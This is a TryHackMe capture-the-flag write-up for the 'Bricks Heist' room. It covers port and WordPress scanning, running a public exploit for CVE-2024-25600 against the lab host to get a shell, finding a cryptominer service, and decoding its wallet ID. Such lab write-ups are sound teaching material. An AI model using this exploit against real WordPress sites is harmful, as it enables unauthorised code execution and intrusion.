+++
title = "TryHack3M: Bricks Heist"
description = "Writeup for TryHackMe 3 Million Users Challenge."
date = 2025-08-21T23:00:00Z
author = "Reber"
tags = ["ctf","osint","cryptography","forensics","wordpress","easy","tryhackme"]
categories = ["CTF Writeup"]
+++

![R4p3cks](/images/R4p3cks.png)

## Table of Contents

-[Table of Contents](#table-of-contents)
    -[Challenge Description](#challenge-description)
    -[Challenge Walkthrough](#challenge-walkthrough)
    -[Initial Reconnaissance](#initial-reconnaissance)
    -[Web Application Analysis](#web-application-analysis)
    -[Vulnerability Search](#vulnerability-search)
    -[Post-Exploitation](#post-exploitation)
    -[Decoding and Blockchain OSINT](#decoding-and-blockchain-osint)

### Challenge Description

From Three Million Bricks to Three Million Transactions!

Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.

Can you hack back the server and identify what happened there?

Note: Add `MACHINE_IP bricks.thm` to your /etc/hosts file.

Answer the questions below:

- What is the content of the hidden.txt file in the web folder?

- What is the name of the suspicious process?

- What is the service name affiliated with the suspicious process?

- What is the log file name of the miner instance?

- What is the wallet address of the miner instance?

- The wallet address used has been involved in transactions between wallets belonging to which threat group?

### Challenge Walkthrough

#### Initial Reconnaissance

Started by adding the provided domain to my `/etc/hosts` file:

```bash
    sudo nano /etc/hosts
```

Then I scanned the target with Nmap to identify open ports and services:

```bash
        nmap -sSVC -p- bricks.thm
```

The scan revealed the following:

```bash
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 2e:ad:5b:0a:49:6e:8f:bb:ae:71:76:60:1d:23:81:a0 (RSA)
    |   256 ce:ff:0f:fd:10:e0:bc:5d:7b:cb:2e:1f:6d:55:11:7c (ECDSA)
    |_  256 4a:76:09:40:fb:a6:5a:66:ef:49:c4:1c:3f:4d:bf:ee (ED25519)
    80/tcp   open  http     Python http.server 3.5 - 3.10
    |_http-title: Error response
    |http-server-header: WebSockify Python/3.8.10
    443/tcp  open  ssl/http Apache httpd
    | http-methods: 
    |  Supported Methods: GET HEAD POST OPTIONS
    | http-robots.txt: 1 disallowed entry 
    |_/wp-admin/
    |_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
    | ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
    | Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2024-04-02T11:59:14
    | Not valid after:  2025-04-02T11:59:14
    | MD5:   f1df:99bc:d5ab:5a5a:5709:5099:4add:a385
    |_SHA-1: 1f26:54bb:e2c5:b4a1:1f62:5ea0:af00:0261:35da:23c3
    |_http-generator: WordPress 6.5
    |_http-server-header: Apache
    |ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |  http/1.1
    |_http-title: Brick by Brick
    3306/tcp open  mysql    MySQL (unauthorized)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed an HTTP server on port 80 and a HTTPS server on port 443, both serving a WordPress site. Port 3306 indicated a MySQL service.

#### Web Application Analysis

Accessing the site at ['https://bricks.thm'](https://bricks.thm) revealed a WordPress site titled "Brick by Brick". The next step was to run WPScan to gather more information about the WordPress installation:

```bash
    wpscan --url https://bricks.thm --disable-tls-checks
```

The scan provided the following information:

```bash
   _______________________________________________________________
             __          _______   _____
             \ \        / /  __ \ / ____|
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|

             WordPress Security Scanner by the WPScan Team
                             Version 3.8.28
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: https://bricks.thm/ [10.10.138.198]
    [+] Started: Thu Aug 21 13:24:02 2025

    Interesting Finding(s):

    [+] Headers
     | Interesting Entry: server: Apache
     | Found By: Headers (Passive Detection)
     | Confidence: 100%

    [+] robots.txt found: https://bricks.thm/robots.txt
     | Interesting Entries:
     |  - /wp-admin/
     |  - /wp-admin/admin-ajax.php
     | Found By: Robots Txt (Aggressive Detection)
     | Confidence: 100%

    [+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: https://bricks.thm/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
     | Found By: Rss Generator (Passive Detection)
     |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
     |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

    [+] WordPress theme in use: bricks
     | Location: https://bricks.thm/wp-content/themes/bricks/
     | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
     | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
     | Style Name: Bricks
     | Style URI: https://bricksbuilder.io/
     | Description: Visual website builder for WordPress....
     | Author: Bricks
     | Author URI: https://bricksbuilder.io/
     |
     | Found By: Urls In Homepage (Passive Detection)
     | Confirmed By: Urls In 404 Page (Passive Detection)
     |
     | Version: 1.9.5 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

    [+] Enumerating All Plugins (via Passive Methods)

    [i] No plugins Found.
```

The scan indicated that the WordPress version was 6.5 and the theme in use was "Bricks" (v1.9.5). No plugins or config backups were detected. Since the challenge name referenced "bricks", I searched for vulnerabilities related to the bricks theme.

#### Vulnerability Search

Searching: `Wordpress bricks theme 1.9.5 version exploit` led me to a [Github repository](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT) with an exploit for CVE-2024-25600, and included version 1.9.5 but after executing the exploit i got:

```bash
    python3 CVE-2024-25600.py -u https://bricks.thm/
    ~/Downloads/CVE-2024-25600.py:20: SyntaxWarning: invalid escape sequence '\ '
      / / |  / / /   | \ /  _ / // /      | \ / __/ __//  /  \
    Traceback (most recent call last):
      File "~/Downloads/CVE-2024-25600.py", line 13, in <module>
        from alive_progress import alive_bar
    ModuleNotFoundError: No module named 'alive_progress'
```

Errors.... So i had to find another repository that contained the necessary pip packages to run the exploit. After some searching, I found what i was looking for: A [GitHub repository](https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress) that contained the exploit.py and the requirements.txt. So i cloned the repository and after running the exploit:

```bash
    python3 exploit.py -u https://bricks.thm/
    [*] Nonce found: 36f00ad481
    [+] https://bricks.thm/ is vulnerable to CVE-2024-25600, apache
    [!] Shell is ready, please type your commands UwU
    ls
    650c844110baced87e1606453b93f22a.txt
    index.php
    kod
    license.txt
    phpmyadmin
    readme.html
    wp-activate.php
    wp-admin
    wp-blog-header.php
    wp-comments-post.php
    wp-config-sample.php
    wp-config.php
    wp-content
    wp-cron.php
    wp-includes
    wp-links-opml.php
    wp-load.php
    wp-login.php
    wp-mail.php
    wp-settings.php
    wp-signup.php
    wp-trackback.php
    xmlrpc.php 

    cat 650c844110baced87e1606453b93f22a.txt
    THM{redacted}
```

First Flag found :D

#### Post-Exploitation

Focusing on the second question: "What is the name of the suspicious process?". I ran the command to display active system services:

```bash
    systemctl | grep running
```

Output:

```bash
     acpid.path                                       loaded active     running   ACPI Events Check                                                            
      init.scope                                       loaded active     running   System and Service Manager                                                 
      .....
      systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
      redacted.service                                   loaded active     running   TRYHACK3M                                               
      ....
```

Now i can answer to the third question: The service name affiliated with the suspicious process is:
> redacted.service

To check more details about the suspicious service:

```bash
    systemctl status redacted.service
    redacted.service - TRYHACK3M
         Loaded: loaded (/etc/systemd/system/redacted.service; enabled; vendor preset: enabled)
         Active: active (running) since Thu 2025-08-21 18:51:13 UTC; 4min 8s ago
       Main PID: 2841 (redacted-process)
          Tasks: 2 (limit: 4671)
         Memory: 31.3M
         CGroup: /system.slice/redacted.service
                 ├─2841 /lib/NetworkManager/redacted-process
                 └─2842 /lib/NetworkManager/redacted-process
```

From that output, I can answer the second question: The suspicious process is:
> redacted-process

I changed the directory `cd /lib/NetworkManager/redacted-process`, downloaded the binary to my machine to try and analyse it to confirm it was a cryptominer.
![Virus Total Screenshot](/tryhack3m-bricks-heist/miner.png)

In the same directory I found `redacted.conf` (answer to the "What is the log file name of the miner instance?"). Doing `cat redacted.conf` reveals the following configuration:

```bash
    cat redacted.conf
    ID: 5757..8526a4a6..6c525054303d
    2024-04-08 10:46:04,743 [] confbak: Ready!
    2024-04-08 10:46:04,743 [] Status: Mining!
    2024-04-08 10:46:08,745 [] Miner()
    2024-04-08 10:46:08,745 [] Bitcoin Miner Thread Started
    2024-04-08 10:46:08,745 [] Status: Mining!
    2024-04-08 10:46:10,747 [] Miner()
    2024-04-08 10:46:12,748 [*] Miner()
```

### Decoding and Blockchain OSINT

I noticed the ID looks Hexadecimal, so I convert it to ASCII using my good old reliable friend [CyberChef](https://cyberchef.org/):

> `WW1NeGN..lRPT0=`

Now it's base64, so using the operation `from base64` ...another base64 :P

> 'YmMx..2dDRsNjdxYQ=='

Using again the same operation:

> bc1qyk..ptl4l7qabc1...ptl8avt4l7qa

I checked the questions again and it's about a wallet address so after analyzing the string i find the start `bc1` it's repeting in the middle. The answer to the second-to-last question is right there.

Now to answer the last question (threat group), I inspected the blockchain ledger for transactions related to this wallet. I found several transactions linking this wallet to other addresses. Searching for the others envolved addresses i find:
![final_flag](/tryhack3m-bricks-heist/final_flag.png)
